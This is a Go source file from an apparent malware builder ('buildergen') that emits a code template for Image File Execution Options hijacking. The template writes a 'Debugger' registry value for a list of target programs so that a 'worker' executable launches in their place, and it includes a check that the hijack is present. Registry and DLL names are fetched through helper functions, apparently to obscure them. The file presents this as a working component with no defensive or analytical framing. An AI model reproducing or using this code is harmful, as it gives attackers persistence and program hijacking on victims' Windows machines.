package buildergen

import "strings"

func templateIFEO() string {
	return strings.TrimSpace(`
func setupIFEO(workerPath string) {
	if !isAdmin() {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regCreateKeyEx := advapi32.NewProc(getRegCreateKeyExWName())
	regSetValueEx := advapi32.NewProc("RegSetValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	targets := getIFEOTargets()

	for _, target := range targets {
		subKey := getIFEOBasePath() + "\\" + target
		keyPath, _ := syscall.UTF16PtrFromString(subKey)
		var hKey syscall.Handle
		var disp uint32
		ret, _, _ := regCreateKeyEx.Call(
			uintptr(0x80000002),
			uintptr(unsafe.Pointer(keyPath)),
			0, 0, 0,
			uintptr(0x20006),
			0,
			uintptr(unsafe.Pointer(&hKey)),
			uintptr(unsafe.Pointer(&disp)),
		)
		if ret != 0 {
			continue
		}

		valName, _ := syscall.UTF16PtrFromString("Debugger")
		cmdLine := "\"" + workerPath + "\" worker"
		valData, _ := syscall.UTF16FromString(cmdLine)
		dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
		regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))
		regCloseKey.Call(uintptr(hKey))
	}
}

func isIFEOPresent() bool {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	targets := getIFEOTargets()
	if len(targets) == 0 {
		return true
	}

	subKey := getIFEOBasePath() + "\\" + targets[0]
	keyPath, _ := syscall.UTF16PtrFromString(subKey)
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return false
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString("Debugger")
	var vType, dataSize uint32
	r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
	return r2 == 0
}
`)
}
